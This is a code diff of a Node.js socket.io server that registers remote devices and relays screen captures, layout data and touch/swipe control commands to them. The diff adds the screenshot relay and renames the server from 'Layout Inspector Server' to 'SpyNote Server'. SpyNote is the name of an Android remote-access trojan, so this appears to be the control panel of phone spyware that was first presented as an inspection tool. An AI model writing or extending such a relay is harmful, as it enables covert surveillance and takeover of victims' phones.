@@ -14,7 +14,7 @@ const io = socketIo(server, {
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '100mb' })); // Large layout frames
+app.use(express.json({ limit: '50mb' }));
 
 const devices = new Map();
 
@@ -34,17 +34,25 @@ io.on('connection', (socket) => {
                 socketId: socket.id 
             });
             socket.join(deviceId);
-            console.log("🔍 Layout device registered:", deviceId, deviceInfo.status);
+            console.log("📱 Device joined:", deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // 🔥 LAYOUT FRAME RELAY
-    socket.on('layout-frame', (data) => {
+    // 🔥 Layout relay (MOST IMPORTANT)
+    socket.on('layout-update', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('layout-frame', data);
-            console.log('🎨 Layout frame relayed:', deviceId, data.elements?.length || 0, 'elements');
+            socket.to(deviceId).emit('layout-update', data);
+            console.log('📐 Layout relayed:', deviceId);
+        }
+    });
+
+    // Screenshot relay
+    socket.on('screen-frame', (data) => {
+        const deviceId = data.deviceId;
+        if (devices.has(deviceId)) {
+            socket.to(deviceId).emit('screen-frame', data);
         }
     });
 
@@ -61,7 +69,7 @@ io.on('connection', (socket) => {
                 endX: parseFloat(endX) || 0, 
                 endY: parseFloat(endY) || 0
             });
-            console.log('🎮 Control:', action, 'to', deviceId, {x,y});
+            console.log('🎮 Control:', action, 'to', deviceId);
         }
     });
 
@@ -70,7 +78,7 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Layout device disconnected:', deviceId);
+                console.log('📱 Device disconnected:', deviceId);
                 break;
             }
         }
@@ -79,6 +87,7 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 Layout Inspector Server: http://localhost:${PORT}`);
-    console.log(`🔍 Web panel ready for layout inspection!`);
+    console.log(`🚀 SpyNote Server on port ${PORT}`);
+    console.log(`🌐 Web: http://localhost:${PORT}`);
+    console.log(`📱 Layout + Screenshot Ready!`);
 });
